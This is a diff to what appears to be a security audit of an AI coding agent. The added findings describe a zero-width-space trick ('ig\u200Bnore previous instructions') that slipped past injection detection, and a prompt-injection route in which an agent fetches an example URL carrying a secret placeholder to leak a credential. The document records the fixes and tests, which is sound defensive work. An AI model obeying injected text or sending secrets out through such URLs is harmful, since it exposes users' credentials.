@@ -313,6 +313,18 @@ Each item below was reproduced with an attack test before the fix; the same test
 
 **Fix:** `commandSpellings()` decodes `$'...'`/`$"..."`, strips grouping words and keywords, unwraps `exec`/`env -S`, and adds the command of `find -exec/-execdir/-ok/-okdir`. **Test:** `test/permission-deny-spellings.test.mjs`. **Remaining by design:** arguments from stdin (`echo push | xargs git`) and interpreter code (`python -c`) cannot be matched; use the sandbox for hard guarantees.
 
+### Untrusted-content guard missed MCP resources and split keywords (low)
+
+**Finding:** `read_mcp_resource` results skipped the guard that `mcp_*` tool results get, so an injected resource never set the turn hold that makes later shell commands ask. A single zero-width space or soft hyphen inside a word (`ig\u200Bnore previous instructions`) also hid the phrase from detection; only runs of three or more were removed.
+
+**Fix:** `read_mcp_resource` counts as external content, and detection runs on text with zero-width and soft-hyphen characters removed. **Test:** `test/untrusted-content.test.mjs`.
+
+### Secret placeholders were swapped into outbound URLs (medium)
+
+**Finding:** the secret shield swapped `«secret:ID»` placeholders back to the real value in every tool's arguments before authorization. `fetch_url` asks once per host, so a prompt-injected page on a host the user already approved could have the agent fetch `https://host/collect?k=«secret:ID»` and receive the credential with no further prompt; `web_search` queries were unmasked the same way.
+
+**Fix:** `fetch_url`, `web_search` and `browser` keep the placeholder text; file edits and commands still receive the real value. **Test:** `test/secret-shield.test.mjs` (end-to-end with a `PreToolUse` hook recording the final input). **Remaining:** commands and MCP tools still receive real values by design (that is how the agent edits `.env` or passes a token); a `task` prompt containing a placeholder gives the subagent the real value, which then reaches the provider.
+
 ### Areas tested that held up
 
 - Local web runtime (`src/web.mjs`): every `/api` route requires the bearer token (timing-safe compare); Host must be loopback or a configured LAN host, so DNS rebinding fails; browser Origin must match the request host; static `/app/` and `/src/` routes reject `..` and check containment. The VS Code bridge (`ide/vscode/src/server.js`) binds `127.0.0.1`, requires a token and rejects any browser Origin.
